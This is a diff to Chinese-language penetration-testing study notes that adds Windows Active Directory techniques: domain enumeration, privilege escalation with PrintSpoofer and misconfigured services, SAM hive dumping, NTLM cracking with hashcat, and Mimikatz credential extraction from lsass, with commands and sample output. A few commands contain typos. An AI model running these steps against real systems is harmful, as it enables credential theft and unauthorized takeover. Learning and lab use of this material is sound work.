@@ -104,6 +104,27 @@ $ file [filename]
 * [Shodan](https://www.shodan.io/dashboard) / [Censys](https://search.censys.io/): 搜尋 Internet 上所有公開設備與服務的搜尋引擎
     ![](https://hackmd.io/_uploads/Hym-h3oH2.png)
 
+#### For Windows AD
+* 查詢本地使用者
+    ```bash
+    $ net user
+    $ net user <username>
+    ```
+* 查詢網域使用者
+    ```bash
+    $ net user /domain
+    $ net user <username> /domain
+    ```
+* 可能可以從AD user的description中看到機敏資訊
+    ```bash
+    $ Get-ADUser -Filter * -Proper Description | Select-object Name,Description
+    ```
+* 情報蒐集：當前網域控制站(DC)，以下兩種都可以
+    ```bash
+    $ echo %logonserver%
+    $ nltest /dclist:kuma.org
+    ```
+
 #### Inspect Platform
 * [Virus Total](https://www.virustotal.com/gui/home/upload)
 * [Alien Vault](https://otx.alienvault.com)
@@ -229,9 +250,79 @@ $ file [filename]
 * 找漏洞
 * CVE analysis
 
+#### For Windows AD
+* [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng): 如果已經進入AD，想要本地提權，比較快的方式就是直接利用本地端的弱點，這個repo可以分析目前的狀況給予一些cve的建議
+    ```bash
+    $ git clone https://github.com/bitsadmin/wesng.git --depth 1
+    $ cd wesng
+    $ python wes.py --update
+    $ systeminfo.exe > systeminfo.txt # 這條指令是windows內建的指令，所以一定要在cmd中操作
+    $ python wes.py systeminfo.txt
+    ```
+
 ### Exploitation
 * 利用漏洞取得 access
 * Post Exploitation
+
+#### For Windows AD
+* 錯誤配置
+    * 服務使用高權限執行且檔案權限配置錯誤，所以只要把這項服務替換成惡意程式，最後再利用前面提到的print operator重開機，就可以達到控制的目的
+    * 透過[accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)找出有問題的地方
+        ```bash
+        $ accesschk.exe <user> <path>
+        
+        $ accesschk.exe "Administrator" "C:\\Program Files\\"
+
+        Accesschk v6.15 - Reports effective permissions for securable objects
+        Copyright (C) 2006-2022 Mark Russinovich
+        Sysinternals - www.sysinternals.com
+        RW C:\\Program Files
+        ```
+* 收集更多密碼<span style="background-color: yellow">(已經提權成功的前提下)</span>
+    * Brute Force SAM
+        1. 利用reg.exe(Windows註冊碼工具)匯出SAM File
+            ```bash
+            # 方法1
+            $ reg save HKLM\\SAM <save filename>
+            $ reg save HKLM\\SYSTEM <save filename>
+            # 方法2
+            $ c:\\tools\\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam"
+            # 方法3: 利用Invoke-NinjaCopy.ps1這個腳本，就可以複製出來，原理是使用windows的影子複製
+            $ .\\Invoke-NinjaCopy -Path SAM -LocalDestination C:\\tools\\SAM_COPY
+            ```
+            [Invoke-NinjaCopy.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1)
+        2. 解析SAM內容
+            * Win10 v1607之前的解法: 用kali的samdump2解析，如果看到很多disabled，就要使用下面的方法
+                ```bash
+                $ samdump2 system sam 
+                ```
+            * Win10 v1607之後有用到AES加密，所以可以用[Creddump7](https://github.com/CiscoCXSecurity/creddump7)，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事
+                ```bash
+                $ conda activate py2.7
+                $ pip install pycrypto
+                $ git clone https://github.com/CiscoCXSecurity/creddump7.git
+                $ python pwdump.py system sam
+                ```
+        3. 解析hash
+            * 方法一：用online database，就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如[cmd5](https://www.cmd5.com/)
+            * 方法二：爆字典檔，在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看
+                ```bash
+                $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+                $ cp /usr/share/wordlists/rockyou.txt ./
+                $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force
+                ```
+    * Password Spraying(用猜的)用一組密碼去爆所有的帳號
+    * GPO
+    * 記憶體(lsass): 透過Mimikatz取得Local Admin的NTLM
+        
+        以系統管理員啟動mimikatz
+        ```bash
+        $ Privilege::Debug
+        Privilege '20' OK
+        $ log
+        Using 'mimikatz.log' for logfile : OK
+        $ Sekurlsa::logonPasswords
+        ```
 
 #### Wireless Related
 * 大部分都會用到[Aircrack](https://sectools.tw/aircrack-ng-%E6%95%99%E5%AD%B8/)這個工具
@@ -289,11 +380,24 @@ $ file [filename]
 * for WPA/Wifi based: [`aircrack-ng`](https://linuxhint.com/install_aircrack-ng_ubuntu/), [Wifite](https://ithelp.ithome.com.tw/articles/10280928)
 * creddump: [教學]({{base.url}}/NTUSTISC-AD-Note-Lab(0x13Brute-Force-SAM)/)
 
-### privilege escalation
+### Privilege Escalation
 * lateral movement
 * data exfiltration
-* For Windows: [Mimikatz](https://github.com/ParrotSec/mimikatz)
+* For Windows: [Mimikatz](https://github.com/ParrotSec/mimikatz): 一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。實際使用可以參考[NTUSTISC - AD Note - Lab(0x16透過Mimikatz取得Local Admin的NTLM)]({{base.url}}/NTUSTISC-AD-Note-Lab(0x16透過Mimikatz取得Local-Admin的NTLM)/)
 
+#### For Windows AD
+* Hijack Token: [PrintSpoofer](https://github.com/itm4n/PrintSpoofer): Support: Windows 8.1/Server 2012 R2/10/Server 2019
+    * 如果進入的AD有`SeImpersonatePrivilege => CreateProcessWithToken()`,`SeAddignPrimaryToekn => CreateProcessAsUser()`這兩個其中一個權限的話才能用
+    ```bash
+    $ whoami /priv # 先看一下目前的AD有哪些權限
+    $ PrintSpoofer.exe -c "whoami"
+    [+] Found privilege: SeImpersonatePrivilege
+    [+] Named pipe listening ...
+    [+] CreateProcessAsUser() OK
+    $ PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c whoami > c:\inetpub\wwwroot\tmp.txt"
+    $ cat "c:\inetpub\wwwroot\tmp.txt"
+    nt authority\\system # 目前權限已經轉換成nt authority\system也就是前面說的==本地端真正的最高權限使用者==
+    ```
 
 ### Reporting
 * 撰寫 pentest report
@@ -409,7 +513,20 @@ $ file [filename]
     ```
 
 ### 安全取證 / 數位取證
-* AccessChk: 查看檔案、登錄項、服務的權限，方便檢查系統安全性。
+* AccessChk: 用來查看「某個 user / group 對某個資源到底有沒有權限」，查看檔案、登錄項、服務的權限，方便檢查系統安全性。
+    ```bash
+    # 檢查某 user 對資料夾權限
+    $ accesschk user C:\\test
+
+    # 找可寫的 service（常見提權）
+    $ accesschhk -uwcqv "Authnticated Users" *
+
+    # 找可寫的 registry
+    $ accesschk -k HKLM\\Software
+
+    # 找某 user 的所有權限
+    $ accesschk -d user
+    ```
 * Sigcheck: 驗證執行檔簽名與版本資訊，檢測潛在惡意程式。
 * VMMap: 分析程序的記憶體使用情況，包括堆、棧、映射文件。
 
